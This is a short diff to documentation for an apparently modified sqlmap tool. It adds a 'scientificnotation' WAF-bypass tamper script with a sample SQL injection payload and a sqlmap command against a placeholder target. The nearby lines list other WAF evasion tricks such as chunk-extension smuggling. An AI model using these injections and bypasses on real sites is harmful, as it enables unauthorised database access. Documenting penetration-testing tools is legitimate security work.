@@ -62,6 +62,7 @@ Automatically applies tamper scripts based on aggressiveness level (1-5):
 | Script | Description |
 |--------|-------------|
 | `oversizedrequest` | Bypass WAF body size limits (8KB-64MB) |
+| `scientificnotation` | E notation bypass (`' OR 1337.e('')='`) - @ptswarm technique |
 | `chunkextensionsmuggle` | HTTP desync via malformed chunk extensions |
 | `parampollutionfull` | Advanced HTTP Parameter Pollution |
 | `contenttypeconfusion` | Content-Type header manipulation |
@@ -80,6 +81,9 @@ python sqlmap.py -u "http://target.com/?id=1" --chunked --tamper=chunkextensions
 
 # Unicode bypass for pattern-matching WAFs
 python sqlmap.py -u "http://target.com/?id=1" --tamper=unicodenormalize
+
+# Scientific notation bypass (ptswarm technique)
+python sqlmap.py -u "http://target.com/?id=1" --tamper=scientificnotation
 
 # Combined techniques
 python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=3 --chunked
